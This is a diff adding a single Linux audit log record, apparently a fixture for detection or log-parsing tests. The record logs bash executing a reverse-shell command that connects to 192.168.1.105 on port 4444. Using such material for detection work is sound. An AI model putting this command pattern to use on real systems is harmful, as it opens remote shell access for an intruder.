@@ -1,0 +1,1 @@
+type=SYSCALL msg=audit(1779953407.123:467): arch=c000003e syscall=59 success=yes exe="/bin/bash" a0="bash" a1="-c" a2="exec /dev/tcp/192.168.1.105/4444 0>&1" key="exec"
